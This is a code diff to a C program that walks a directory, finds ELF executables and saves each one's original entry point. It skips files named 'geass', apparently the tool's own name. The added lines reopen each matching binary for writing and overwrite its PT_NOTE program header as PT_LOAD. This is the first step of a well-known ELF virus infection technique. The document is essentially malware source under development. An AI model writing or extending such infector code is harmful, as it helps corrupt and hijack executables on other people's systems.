@@ -21,10 +21,9 @@ int walkDirectory(const char *filename, const struct stat *statptr, int fileflag
     Elf64_Ehdr elfHeader;
     int result;
     long unsigned int originalEntryPoint;
-    
+
     filePointer = fopen(filename, "rb");
     fread(&elfHeader, sizeof(elfHeader), 1, filePointer);
-
     result = checkifElf(elfHeader);
     if(result == 0 && elfHeader.e_type == 3 && strstr(filename, "geass") == NULL){
         printf("[*] %s is an Executable ELF file!\n", filename);
@@ -33,14 +32,27 @@ int walkDirectory(const char *filename, const struct stat *statptr, int fileflag
         originalEntryPoint = elfHeader.e_entry;
 
         Elf64_Phdr elfSegment;
+        int segmentCount = 0;
         while(elfSegment.p_type != 4){
             fread(&elfSegment, sizeof(elfSegment), 1, filePointer);
+            segmentCount += 1;
         }
 
+        fclose(filePointer);
+
+        filePointer = fopen(filename, "r+b");
+        
+        int bytePosition = sizeof(Elf64_Ehdr) + (segmentCount - 1)*sizeof(Elf64_Phdr);
+        
+        fseek(filePointer, bytePosition, SEEK_SET);
+        
         elfSegment.p_type = 1;
+        fwrite(&elfSegment, sizeof(elfSegment), 1, filePointer);
         if(elfSegment.p_type == 1){
             printf("\tPT_NOTE segment Updated to PT_LOAD segment\n");
         }
+
+        fclose(filePointer);
     }
 
     return 0;
